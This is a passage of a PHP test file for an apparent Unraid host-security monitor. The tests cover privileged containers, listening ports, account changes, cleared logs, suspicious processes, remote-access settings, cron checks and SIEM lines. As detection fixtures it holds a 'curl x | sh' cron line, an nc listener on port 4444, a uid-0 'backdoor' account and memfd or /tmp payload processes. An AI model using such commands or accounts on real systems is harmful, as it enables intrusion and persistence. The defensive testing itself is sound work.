    foreach (['share', 'flash', 'access', 'ftp', 'docker', 'boot'] as $to) {
        check("watchman: link label posture.to_$to", isset($en["posture.to_$to"]));
    }
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The posture tip «containers run privileged» (inbox #10, 1.51.0: it named a container that was stopped and not on
 * autostart): only privileged containers that run or start by themselves count — Unraid's autostart list, Docker's
 * restart policy «always», Compose Manager's autostart of the stack; one stopped that nothing starts is a quiet line in
 * the tip (none when it is the only one). A stack Compose Manager doesn't know, or whose folder lies under /mnt: counts.
 * A round Docker doesn't answer keeps the last word; seen.json keeps `start`, never pid, restart or compose.
 */
function testWatchmanPrivilegedStopped(): void
{
    $now = strtotime('2026-10-09 12:00:00');
    $tmp = hardeningTmp('wm-privileged');
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'extra', 'ssh', 'projects/media', 'projects/tools', 'projects/old'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    file_put_contents("$src/autostart", "plex\nvpn 10\n");
    file_put_contents("$src/projects/media/project_name", "media\n");
    file_put_contents("$src/projects/media/autostart", "true\n");
    file_put_contents("$src/projects/tools/autostart", "false\n");       // no project_name: the folder's name
    file_put_contents("$src/projects/old/name", "Legacy\n");
    file_put_contents("$src/projects/old/autostart", "false\n");
    $priv = ['--privileged'];
    $ct = fn (int $pid, array $more = []) => ['image' => 'x', 'tokens' => $priv, 'pid' => $pid, 'addrs' => [], 'macs' => []] + $more;
    $containers = [
        'running'   => $ct(4242),
        'vpn'       => $ct(0),                                      // on Unraid's autostart list
        'always'    => $ct(0, ['restart' => 'always']),
        'unless'    => $ct(0, ['restart' => 'unless-stopped']),     // Unraid stopped it: nothing brings it back
        'stack-on'  => $ct(0, ['compose' => 'media']),
        'stack-off' => $ct(0, ['compose' => 'tools']),
        'legacy'    => $ct(0, ['compose' => 'legacy']),             // an older folder: only `name`, compose lower-cases
        'stack-who' => $ct(0, ['compose' => 'elsewhere']),          // Compose Manager doesn't know it
        'stopped'   => $ct(0),
        'web'       => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp'], 'pid' => 0],
    ];
    ksort($containers);                                             // as watchmanContainers() gives them
    $paths = ['docker_autostart' => "$src/autostart", 'compose_cfg' => "$src/compose.manager.cfg", 'compose_projects' => "$src/projects"];
    $starts = array_map(fn ($c) => $c['start'] ?? null, watchmanContainerStarts($containers, $paths));
    same('privileged starts: runs, starts by itself (autostart list, «always», the stack\'s autostart), or neither; unknown left unsaid',
        ['always' => 'auto', 'legacy' => 'off', 'running' => 'run', 'stack-off' => 'off', 'stack-on' => 'auto', 'stack-who' => null, 'stopped' => 'off',
         'unless' => 'off', 'vpn' => 'auto', 'web' => null], $starts);
    file_put_contents("$src/compose.manager.cfg", "PROJECTS_FOLDER=\"/mnt/user/appdata/compose\"\n");
    same('privileged starts: Compose Manager\'s folder under /mnt — never looked into (no disk woken), the stacks unsaid',
        [null, null, 'off'], array_values(array_intersect_key(array_map(fn ($c) => $c['start'] ?? null, watchmanContainerStarts($containers, $paths)),
            array_flip(['stack-on', 'stack-off', 'stopped']))));
    unlink("$src/compose.manager.cfg");

    // the tip: what runs or starts by itself, the rest a quiet line; nothing but quiet ones: no tip
    $tip = fn (array $cts) => array_column(watchmanPosture([], ['containers' => $cts]), null, 'id')['privileged'] ?? null;
    $seenCts = watchmanContainerStarts($containers, $paths);
    $t = $tip($seenCts);
    same('privileged tip: counts what runs or starts by itself, the stopped ones without autostart quietly beside',
        ['names' => 'always, running, stack-on, stack-who, vpn', 'n' => 5, 'quiet' => 'legacy, stack-off, stopped, unless', 'quiet_n' => 4], $t['p'] ?? null);
    same('privileged tip: only stopped ones without autostart — no tip', null,
        $tip(['old' => ['tokens' => $priv, 'start' => 'off'], 'web' => ['tokens' => [], 'start' => 'off']]));
    same('privileged tip: without a word on how it starts (an older look, the tests) it counts as before', ['names' => 'a', 'n' => 1],
        $tip(['a' => ['tokens' => $priv]])['p'] ?? null);
    check('privileged tip: what it is about is what counts — a quiet one starting brings it back',
        ($tip(['a' => ['tokens' => $priv, 'start' => 'run'], 'b' => ['tokens' => $priv, 'start' => 'off']])['sig'] ?? 1)
        !== ($tip(['a' => ['tokens' => $priv, 'start' => 'run'], 'b' => ['tokens' => $priv, 'start' => 'run']])['sig'] ?? 1));
    same('privileged tip: a quiet one more or less leaves it alone',
        $tip(['a' => ['tokens' => $priv, 'start' => 'run']])['sig'] ?? 1, $tip(['a' => ['tokens' => $priv, 'start' => 'run'], 'b' => ['tokens' => $priv, 'start' => 'off']])['sig'] ?? 2);

    // through his round: seen.json keeps `start`, never pid, restart or compose; Docker not answering keeps the last word
    $paths += ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
               'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    $answer = $containers;
    $docker = function () use (&$answer) {
        return $answer;
    };
    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $now + $t, $docker, false, "$tmp/acks.json");
    $page = fn (int $t) => array_column(watchmanPageState($data, $now + $t, false)['posture']['tips'] ?? [], null, 'id')['privileged']['p'] ?? null;
    $round(0);
    same('privileged round: the tip as above', $t['p'], $page(10));
    $kept = readJson("$data/seen.json")['containers'] ?? [];
    same('privileged round: seen.json keeps how it starts, nothing of the round\'s own', [['image', 'tokens', 'start'], ['image', 'tokens']],
        [array_keys($kept['stack-on'] ?? []), array_keys($kept['web'] ?? [])]);
    $answer = null;
    $round(300);
    same('privileged round: Docker didn\'t answer — as the last round saw it', $t['p'], $page(310));
    $answer = $containers;
    $answer['stopped']['pid'] = 777;
    $round(600);
    same('privileged round: the quiet one started — counted now', [6, 'legacy, stack-off, unless'], [$page(610)['n'] ?? null, $page(610)['quiet'] ?? null]);
    hardeningRm($tmp);
}

/**
 * Snapshots that vanish: round against round, ZFS of the awake pools and the btrfs snapshot folders of the
 * awake disks — what the office removed itself (Ms. Snapshotini's log, the engine's retention during its
 * run, renamed, the storeroom) is no news; the rest is snap_gone with zpool history and the syslog; a hold
 * released not by Ms. Snapshotini is snap_hold_released; a pool asleep is never "gone"; «I know, thanks»
 * teaches a series
 */
/**
 * The night watchman's look at the host (SOC, 1.30): listeners from ss, accounts in RAM, logs emptied outside their
 * rotation, programs from scratch folders (a stand-in /proc of links), the office's own schedule lines, ATT&CK ids.
 */
function testWatchmanHost(): void
{
    $now = strtotime('2026-10-07 01:00:00');
    // ss -H -tlnp as on a large server: Docker's forwarders, the VMs' consoles, loopback and a dynamic port
    $ss = "LISTEN 0 4096 0.0.0.0:9100 0.0.0.0:* users:((\"node_exporter\",pid=11,fd=3))\n"
        . "LISTEN 0 4096 [::]:9100 [::]:* users:((\"node_exporter\",pid=11,fd=4))\n"
        . "LISTEN 0 128 0.0.0.0%br0:3702 0.0.0.0:* users:((\"wsdd2\",pid=12,fd=5))\n"
        . "LISTEN 0 4096 0.0.0.0:2283 0.0.0.0:* users:((\"docker-proxy\",pid=13,fd=4))\n"
        . "LISTEN 0 1 0.0.0.0:5900 0.0.0.0:* users:((\"qemu-system-x86\",pid=14,fd=30))\n"
        . "LISTEN 0 64 127.0.0.1:631 0.0.0.0:* users:((\"cupsd\",pid=15,fd=7))\n"
        . "LISTEN 0 64 192.168.20.20:41234 0.0.0.0:* users:((\"rpc.statd\",pid=16,fd=8))\n"
        . "LISTEN 0 64 [::1]:25 [::]:* users:((\"sendmail\",pid=17,fd=9))\n";
    $l = watchmanListenParse($ss, 32768);
    same('host listen: Docker, VM consoles and loopback left out; a dynamic port counts by program',
        ['rpc.statd:*', 'tcp:3702', 'tcp:9100'], array_keys($l));
    same('host listen: addresses, all as *; the program', [['*'], 'node_exporter', null, ['192.168.20.20']],
        [$l['tcp:9100']['addr'], $l['tcp:9100']['prog'], $l['rpc.statd:*']['port'], $l['rpc.statd:*']['addr']]);
    same('host listen: Samba names another process of its own next time — the same port, nothing new', ['tcp:445'],
        array_keys(watchmanListenParse("LISTEN 0 50 0.0.0.0:445 0.0.0.0:* users:((\"smbd-scavenger\",pid=3,fd=37),(\"smbd\",pid=2,fd=37))\n", 32768)));

    $tmp = sys_get_temp_dir() . '/office-tests-host-' . getmypid();
    @mkdir($tmp, 0700, true);
    // accounts: the shell field, the password's state (never the hash)
    file_put_contents("$tmp/passwd", "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/bin/false\nbenj:x:1000:100::/:/bin/false\nnobody:x:99:100::/:\n");
    file_put_contents("$tmp/shadow", 'root:$6$aa$bb:1::::::' . "\nbin:*:1::::::\nbenj:\$6\$cc\$dd:1::::::\nnobody:!:1::::::\n");
    $u = watchmanHostUsers(['etc_passwd' => "$tmp/passwd", 'etc_shadow' => "$tmp/shadow"]);
    same('host users: uid, login shell (an empty field is /bin/sh), the password only as a state',
        ['root' => [0, true, 'hash'], 'bin' => [1, false, 'locked'], 'benj' => [1000, false, 'hash'], 'nobody' => [99, true, 'locked']],
        array_map(fn ($x) => [$x['uid'], $x['shell'], $x['pw']], $u));
    check('host users: no hash kept', !str_contains(json_encode($u), '$6$'));

    // logs: inode and size, the rotated copies, logrotate's date
    file_put_contents("$tmp/syslog", str_repeat("line\n", 100));
    file_put_contents("$tmp/logrotate.status", "logrotate state -- version 2\n\"$tmp/syslog\" 2026-10-6-4:30:0\n");
    $logs = fn () => watchmanHostLogs(['syslog' => "$tmp/syslog"], "$tmp/logrotate.status");
    $host = fn (array $lg, ?array $users = null, ?array $listen = null, ?array $procs = null, string $boot = 'b1') =>
        ['boot' => $boot, 'logs' => $lg, 'users' => $users ?? $u, 'listen' => $listen, 'procs' => $procs];
    $known = null;
    $book = [];
    $flash = ['root', 'benj'];
    $first = $host($logs());
    same('host: the first look reports nothing and knows it all', [[], ['root', 'bin', 'benj', 'nobody']],
        [watchmanHostCompare($known, $first, null, $flash, $book, $now), array_keys($known['users'])]);
    file_put_contents("$tmp/syslog", "short\n");
    $cut = $host($logs());
    same('host log: the same file, smaller — emptied', ['log_cleared'], watchmanHostCompare($known, $cut, $first, $flash, $book, $now + 300));
    same('host log: what the entry says', [['cut'], 1], [$book[0]['p']['how'], $book[0]['count']]);
    $book = [];
    rename("$tmp/syslog", "$tmp/syslog.1");
    file_put_contents("$tmp/syslog", "new\n");
    $rot = $host($logs());
    same('host log: renamed to .1 and a new one — a rotation, nothing', [], watchmanHostCompare($known, $rot, $cut, $flash, $book, $now + 600));
    unlink("$tmp/syslog.1");
    unlink("$tmp/syslog");
    file_put_contents("$tmp/syslog", "again\n");
    $repl = $host($logs());
    same('host log: a new file, the old one nowhere — replaced', ['log_cleared'], watchmanHostCompare($known, $repl, $rot, $flash, $book, $now + 900));
    $book = [];
    file_put_contents("$tmp/syslog", "x\n");
    unlink("$tmp/syslog");
    file_put_contents("$tmp/syslog", "y\n");
    file_put_contents("$tmp/logrotate.status", "logrotate state -- version 2\n\"$tmp/syslog\" 2026-10-7-1:15:0\n");
    same('host log: logrotate\'s new date explains a new file', [], watchmanHostCompare($known, $host($logs()), $repl, $flash, $book, $now + 1200));
    file_put_contents("$tmp/syslog", '');
    same('host log: after a reboot (another boot id) nothing is compared', [],
        watchmanHostCompare($known, $host($logs(), boot: 'b2'), $host($logs()), $flash, $book, $now + 1500));

    // accounts later: in RAM only, a second root, a system account that may log in
    $u2 = $u;
    $u2['backdoor'] = ['uid' => 0, 'shell' => true, 'pw' => 'none'];
    $u2['bin'] = ['uid' => 1, 'shell' => true, 'pw' => 'locked'];
    $u2['joe'] = ['uid' => 1001, 'shell' => false, 'pw' => 'hash'];      // made under Users: on the flash too
    $book = [];
    $r = watchmanHostCompare($known, $host($logs(), $u2), null, array_merge($flash, ['joe']), $book, $now + 1800);
    $by = array_column(array_map(fn ($e) => [$e['p']['user'], $e['p']['why']], $book), 1, 0);
    same('host users: in RAM only and a second root; a system account with a login shell; a flash user is the flash watch\'s',
        [['user_ram', 'user_ram'], ['bin' => ['shell'], 'backdoor' => ['new', 'uid0']], true],
        [$r, $by, isset($known['users']['joe'])]);
    $u3 = $u2;
    $u3['bin']['shell'] = false;
    unset($u3['backdoor']);
    $book2 = [];
    watchmanHostCompare($known, $host($logs(), $u3), null, array_merge($flash, ['joe']), $book2, $now + 2100);
    same('host users: safer again (no login shell) is normal by itself', false, $known['users']['bin']['shell']);

    // ports and programs: new later, adopted with «I know, thanks»
    $book = [];
    $l2 = $l + ['tcp:4444' => ['prog' => 'nc', 'port' => 4444, 'addr' => ['*']]];
    same('host listen: the first look at the ports knows them all', [], watchmanHostCompare($known, $host($logs(), $u3, $l), null, $flash, $book, $now + 2400));
    same('host listen: a program on a port it never used', ['listen_new'], watchmanHostCompare($known, $host($logs(), $u3, $l2), null, $flash, $book, $now + 2700));
    $b = ['host' => $known];
    watchmanAdopt($b, array_values(array_filter($book, fn ($e) => $e['kind'] === 'listen_new'))[0], ['host' => ['listen' => $l2]], $now + 3000);
    $book = [];
    same('host listen: «I know, thanks» makes it normal', [], watchmanHostCompare($b['host'], $host($logs(), $u3, $l2), null, $flash, $book, $now + 3300));

    // a stand-in /proc: links readlink() reads; the server's mount namespace is 1's
    $proc = "$tmp/proc";
    $mk = function (int $pid, string $exe, string $mnt, string $pidns, string $comm) use ($proc) {
        @mkdir("$proc/$pid/ns", 0700, true);
        symlink($exe, "$proc/$pid/exe");
        symlink($mnt, "$proc/$pid/ns/mnt");
        symlink($pidns, "$proc/$pid/ns/pid");
        file_put_contents("$proc/$pid/comm", "$comm\n");
    };
    $mk(1, '/sbin/init', 'mnt:[1]', 'pid:[1]', 'init');
    $mk(100, '/usr/bin/php (deleted)', 'mnt:[1]', 'pid:[1]', 'php');                      // replaced by an update: no news
    $mk(101, '/tmp/.x/kworkerd', 'mnt:[1]', 'pid:[1]', 'kworkerd');
    $mk(102, '/memfd:payload (deleted)', 'mnt:[1]', 'pid:[1]', 'payload');
    $mk(103, '/memfd:runc_cloned:/proc/self/exe (deleted)', 'mnt:[1]', 'pid:[1]', 'runc:[1:CHILD]');
    $mk(200, '/usr/bin/bash', 'mnt:[7]', 'pid:[9]', 'bash');                              // virtual-dsm's main process
    $mk(201, '/run/host.bin', 'mnt:[7]', 'pid:[9]', 'host.bin');
    $mk(300, '/tmp/app', 'mnt:[8]', 'pid:[10]', 'app');                                   // a namespace of no container known
    $mk(400, '/tmp/.mount_firefogY32OL/firefox-bin', 'mnt:[1]', 'pid:[1]', 'firefox-bin');   // Unraid's GUI mode: an AppImage
    @mkdir("$proc/self", 0700);
    $p = watchmanHostProcs($proc, ['virtual-dsm' => ['pid' => 200]]);
    same('host procs: scratch folders, hidden folders, memory — on the server or in a container; runc\'s copy and an updated binary are none',
        ['ct:?:/tmp/app', 'ct:virtual-dsm:/run/host.bin', 'host:/memfd:payload', 'host:/tmp/.mount_firefo*/firefox-bin', 'host:/tmp/.x/kworkerd'], array_keys($p));
    same('host procs: what a program picks anew at every start is * in his memory, the entry keeps the real path',
        ['/tmp/.mount_firefoXy12Ab/firefox-bin', '/tmp/*/run.sh', '/tmp/build/go-build', '/usr/bin/x'],
        [$p['host:/tmp/.mount_firefo*/firefox-bin']['exe'] === '/tmp/.mount_firefogY32OL/firefox-bin' ? '/tmp/.mount_firefoXy12Ab/firefox-bin' : '?',
         watchmanOddKey('/tmp/tmp.aB3dE9/run.sh'), watchmanOddKey('/tmp/build/go-build'), watchmanOddKey('/usr/bin/x')]);
    same('host procs: Docker didn\'t answer — not looked at (a container\'s program would seem new)', null, watchmanHostProcs($proc, null));
    $kp = ['procs' => ['host:/usr/x' => $now]];
    $bp = [];
    $hp = fn (array $pr) => ['boot' => 'b1', 'logs' => null, 'users' => null, 'listen' => null, 'procs' => $pr, 'doors' => null];
    $one = ['ct:?:/run/host.bin' => ['where' => '?', 'exe' => '/run/host.bin', 'prog' => 'host.bin']];
    same('host procs: new for one round only (a container restarted between the looks) — nothing; seen two rounds in a row — told',
        [[], ['proc_odd']], [watchmanHostCompare($kp, $hp($one), $hp([]), [], $bp, $now), watchmanHostCompare($kp, $hp($one), $hp($one), [], $bp, $now + 300)]);
    @mkdir("$proc/500/ns", 0700, true);
    symlink('/usr/bin/node_exporter', "$proc/500/exe");
    symlink('mnt:[11]', "$proc/500/ns/mnt");
    symlink('pid:[1]', "$proc/500/ns/pid");
    @mkdir("$proc/600/ns", 0700, true);
    symlink('/tmp/y', "$proc/600/exe");
    symlink('mnt:[12]', "$proc/600/ns/mnt");
    symlink('pid:[1]', "$proc/600/ns/pid");
    same('host procs: a --pid=host container is no name for the server\'s PID namespace', '?',
        watchmanHostProcs($proc, ['Node-Exporter' => ['pid' => 500], 'virtual-dsm' => ['pid' => 200]])['ct:?:/tmp/y']['where'] ?? null);
    same('host procs: the program and where', ['kworkerd', null, 'virtual-dsm'], [$p['host:/tmp/.x/kworkerd']['prog'], $p['host:/tmp/.x/kworkerd']['where'],
        $p['ct:virtual-dsm:/run/host.bin']['where']]);

    // the office's own schedule lines; ATT&CK
    same('office cron: its own line, and what is not', [true, true, false, false, false], [
        watchmanOfficeCronLine('0 3 * * * ' . officeJobCommand('backup')),
        watchmanOfficeCronLine('*/5 * * * * ' . officeJobCommand('snapshots')),
        watchmanOfficeCronLine('0 3 * * * ' . officeJobCommand('backup') . '; curl x | sh'),
        watchmanOfficeCronLine('0 3 * * * bash /tmp/job.sh backup > /dev/null 2>&1'),
        watchmanOfficeCronLine('@reboot root ' . officeJobCommand('backup'))]);
    $book = [watchmanEntry('cron_file', 'cron_file:x/x.cron', $now - 60, ['lines' => 1])];
    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now, ['lines' => 1, 'office' => true]);
    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now + 60, ['lines' => 1, 'office' => true]);
    same('office cron: an open entry about the file is closed as the line, a later change is a line of its own', [2, ['schedule', 'schedule'], [false, false]],
        [count($book), array_column($book, 'by'), array_map('watchmanOpen', $book)]);
    // the ways in: ident.cfg, Connect, single sign-ons, WireGuard — never a key kept
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"yes\"\nPORTSSH=\"22\"\nUSE_UPNP=\"no\"\n");
    file_put_contents("$tmp/connect.json", '{"wanport":0,"dynamicRemoteAccessType":"DISABLED","username":"x"}');
    file_put_contents("$tmp/oidc.json", '{"providers":[{"id":"unraid.net","name":"Unraid.net","clientId":"c","issuer":"https://account.unraid.net"}]}');
    @mkdir("$tmp/wg", 0700);
    $peer = fn () => base64_encode(random_bytes(32));
    $p1 = $peer();
    file_put_contents("$tmp/wg/wg0.conf", "[Interface]\nPrivateKey = " . base64_encode(random_bytes(32)) . "\nListenPort = 51820\n[Peer]\nPublicKey = $p1\nAllowedIPs = 10.253.0.2/32\n");
    $dp = ['ident' => "$tmp/ident.cfg", 'connect' => "$tmp/connect.json", 'oidc' => "$tmp/oidc.json", 'wireguard' => "$tmp/wg"];
    $doors = watchmanHostDoors($dp);
    same('host doors: SSH, UPnP, Connect, a single sign-on, a tunnel with its peer', [['ssh', 'upnp', 'connect', 'oidc:unraid.net', 'wg:wg0'], [true, false, false, true, true], 1, 'account.unraid.net'],
        [array_keys($doors), array_column($doors, 'on'), count($doors['wg:wg0']['peers']), $doors['oidc:unraid.net']['issuer']]);
    check('host doors: no key, no client id kept', !str_contains(json_encode($doors), $p1) && !str_contains(json_encode($doors), 'PrivateKey') && !str_contains(json_encode($doors), '"c"'));
    $kd = null;
    $bk = [];
    $hd = fn (array $d) => ['boot' => 'b1', 'logs' => null, 'users' => null, 'listen' => null, 'procs' => null, 'doors' => $d];
    watchmanHostCompare($kd, $hd($doors), null, [], $bk, $now);
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"yes\"\nPORTSSH=\"2222\"\nUSE_UPNP=\"yes\"\n");
    file_put_contents("$tmp/wg/wg0.conf", "PublicKey = " . $p1 . "\nPublicKey = " . $peer() . "\n");
    file_put_contents("$tmp/oidc.json", '{"providers":[]}');
    same('host doors: SSH on another port, UPnP switched on, a new WireGuard peer — a provider gone is safer',
        ['door_new', 'door_new', 'door_new'], watchmanHostCompare($kd, $hd(watchmanHostDoors($dp)), null, [], $bk, $now + 300));
    same('host doors: what the entries say', [['ssh', 2222], ['upnp', null], ['wg', 1], false],
        [[$bk[0]['p']['door'], $bk[0]['p']['port']], [$bk[1]['p']['door'], $bk[1]['p']['port']], [$bk[2]['p']['door'], $bk[2]['p']['new_peers']], isset($kd['doors']['oidc:unraid.net'])]);
    same('host doors: in words (notifications)', ['SSH, port 2222', 'WireGuard tunnel wg0: 2 peers'],
        [watchmanText($bk[0], 'en')['door'], officeNotifyText('watchman', 'door.wg', ['name' => 'wg0', 'n' => 2], 'en')]);
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"no\"\nPORTSSH=\"2222\"\nUSE_UPNP=\"no\"\n");
    $bk2 = [];
    watchmanHostCompare($kd, $hd(watchmanHostDoors($dp)), null, [], $bk2, $now + 600);
    same('host doors: closed again is normal by itself', [false, false], [$kd['doors']['ssh']['on'], $kd['doors']['upnp']['on']]);

    // for a SIEM: one line of JSON, the technique, the words in English; the summary of what is normal
    $line = watchmanSyslogLine($bk[0] + ['by' => null]);
    $j = json_decode($line, true);
    same('syslog: one line of JSON — kind, technique, important, the entry in English', [false, 'door_new', 'T1133', true, 'A new way in from outside: SSH, port 2222'],
        [str_contains($line, "\n"), $j['kind'], $j['attack'], $j['important'], $j['text']]);
    check('syslog: his own forwarded lines are never evidence', (bool) preg_match(WATCH_SYSLOG_OWN, 'Oct  7 01:00:00 Tower uso-watchman: {"v":1}'));
    $sum = watchmanHostSummary(['users' => $u, 'listen' => ['tcp:9100' => 1], 'procs' => [], 'doors' => $kd['doors']], ['listen' => $l, 'procs' => []]);
    same('host summary: the known ports with their program, the ways in that are open, how many accounts',
        [[['key' => 'tcp:9100', 'prog' => 'node_exporter', 'port' => 9100, 'addr' => ['*']]], ['wg'], 4],
        [$sum['listen'], array_column($sum['doors'], 'what'), $sum['users']]);
    // what may belong together: important, not noted, two kinds or more, each within an hour of another
    $e = fn (string $kind, int $t, ?int $noted = null) => ['id' => 'w' . substr(md5($kind . $t), 0, 10), 'kind' => $kind, 'key' => $kind, 'time' => $t, 'last' => $t,
        'count' => 1, 'p' => ['ip' => '203.0.113.9', 'users' => ['root'], 'services' => ['ssh:password'], 'lines' => 1, 'jobs' => ['* * * * * curl x|sh'],
        'prog' => 'nc', 'port' => 4444], 'noted' => $noted, 'by' => null, 'told' => null];
    $cb = [$e('login_new_ip', $now), $e('cron_new', $now + 600), $e('listen_new', $now + 1500), $e('smb_client', $now + 1600),
           $e('flash_go', $now + 9000), $e('plugin_new', $now + 20000), $e('cron_new', $now + 20010), $e('listen_new', $now + 20020),
           $e('container_new', $now + 20100, $now)];
    $ch = watchmanChains($cb, $now + 21000);
    same('chains: login, cron line and port within the hour; a plugin with its cron line and port (no way in), not important, alone or noted are none',
        [1, 3, ['login', 'sched', 'host']], [count($ch), count($ch[0]['ids']), $ch[0]['groups']]);
    same('chains: damage of two sorts — snapshots gone and much written', 1,
        count(watchmanChains([$e('snap_gone', $now), $e('flow_written', $now + 300)], $now + 600)));
    $cst = ['notify' => true];
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify-stand-in");
    file_put_contents("$tmp/notify-stand-in", "#!/bin/sh\necho \"\$@\" >> " . escapeshellarg("$tmp/notified") . "\n");
    chmod("$tmp/notify-stand-in", 0755);
    $t1 = watchmanChainsDue($cb, $cst, $now + 21000, true, 'en');
    $t2 = watchmanChainsDue($cb, $cst, $now + 21300, true, 'en');
    same('chains: told once when it forms, not again', [[['kind' => 'chain', 'n' => 1, 'sent' => true]], []],
        [array_map(fn ($t) => array_intersect_key($t, ['kind' => 1, 'n' => 1, 'sent' => 1]), $t1), $t2]);
    $cl = json_decode(watchmanSyslogChainLine($t1[0]), true);
    same('chains: the SIEM line — the ids and groups of the chain', ['chain', 3, ['login', 'sched', 'host'], 'Night watchman: 3 entries that may belong together'],
        [$cl['kind'], count($cl['ids']), $cl['groups'], $cl['text']]);
    same('chains: the minutes between when the first and the last came (not when seen again)', [$now, $now + 1500], [$ch[0]['first'], $ch[0]['last']]);
    check('chains: the message names it', str_contains((string) @file_get_contents("$tmp/notified"), '3 entries that may belong together'));
    $off = ['notify' => false];
    same('chains: with the reports off never told, also not later', [[], []],
        [watchmanChainsDue($cb, $off, $now + 21000, true, 'en'), watchmanChainsDue($cb, array_merge($off, ['notify' => true]), $now + 21300, true, 'en')]);
    putenv('OFFICE_NOTIFY_BIN');
    same('attack: every kind has its technique, in ATT&CK\'s shape', [[], []],
        [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK))),
         array_values(array_filter(WATCH_ATTACK, fn ($t) => !preg_match('/^T\d{4}(\.\d{3})?$/D', $t)))]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night shift: a round in RAM only from the mirror (never the data folder), the mirror in RAM and on the flash
 * (throttled, no secrets), the array's lines, the lock, the handover at the array's start (the syslog's place, no
 * entry twice, nothing lost)
 */
function testWatchmanNight(): void
{
    $now = strtotime('2026-10-07 09:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-night-' . getmypid();
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    $night = "$tmp/run/nightshift";
    $ram = "$tmp/run/watchman-mirror.json";
    $flash = "$tmp/flash/watchman-mirror.json";
    $lock = "$tmp/run/nightshift.lock";
    foreach (['plugins', 'extra', 'ssh/root', 'flash', 'run'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    @mkdir("$tmp/flash", 0700, true);
    @mkdir("$tmp/run", 0700, true);
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd", 'array_events' => "$tmp/run/array-events", 'boot_id' => "$tmp/boot_id",
              'stat' => "$tmp/stat"];
    file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime " . ($now - 86400) . "\nprocesses 9\n");
    $boot1 = 'aaaaaaaa-0000-4000-8000-000000000001';
    $boot2 = 'aaaaaaaa-0000-4000-8000-000000000002';
    file_put_contents("$tmp/boot_id", "$boot1\n");
    // the night's places: as watchmanNightPaths() leaves them (no shares' exports)
    $nightPaths = array_diff_key($paths, array_flip(['sec', 'sec_nfs', 'share_cfg']));
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 7200, 'webgui: Successful login user root from 192.168.20.10'));
    file_put_contents("$src/plugins/ca.plg", "<PLUGIN name=\"ca\" version=\"1\" pluginURL=\"https://raw.githubusercontent.com/unraid/ca/master/ca.plg\">\n");
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    file_put_contents($paths['sec'], "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n");
    file_put_contents($paths['sec_nfs'], '');
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\n");
    $docker = fn () => ['plex' => ['image' => 'plex', 'tokens' => ['-p 32400:32400/tcp']]];
    $acks = "$tmp/acks.json";
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $openKeys = fn (array $book) => array_column(array_values(array_filter($book, 'watchmanOpen')), 'key');

    // the day: he takes over, then a login from a new address (told)
    watchmanRound($paths, $day, 1000, $now, $docker, true, $acks);
    file_put_contents($paths['syslog'], $line($now + 200, 'webgui: Successful login user root from 10.0.0.5'), FILE_APPEND);
    watchmanRound($paths, $day, 1000, $now + 300, $docker, true, $acks);
    same('night: the day told the new address', [['login_new_ip:10.0.0.5'], 1], [$openKeys(watchmanLoad($day)['book']), count($calls())]);

    // the mirror: RAM all of it, the flash without secrets and only when changed, at most once an hour
    same('night mirror: first write goes to the flash too', 'flash', watchmanMirrorWrite($day, $ram, $flash, $now + 300, $boot1));
    touch($flash, $now + 300);
    $m = readJson($ram);
    $f = (string) file_get_contents($flash);
    same('night mirror (RAM): baseline, the syslog\'s place with its boot, the open entry', [1000, true, 'boot1', ['login_new_ip:10.0.0.5']],
        [$m['baseline']['hired'], is_array($m['state']['syslog']), ($m['state']['syslog']['boot'] ?? null) === $boot1 ? 'boot1' : null, array_column($m['open'], 'key')]);
    $pw = (string) (watchmanLoad($day)['baseline']['flash']['pw']['root'] ?? 'none');
    check('night mirror (flash): no password fingerprint, no password field, no syslog place, no failures',
        !str_contains($f, $pw) && !str_contains($f, '$6$') && !array_key_exists('syslog', json_decode($f, true)['state']) && !str_contains($f, '"fails"'));
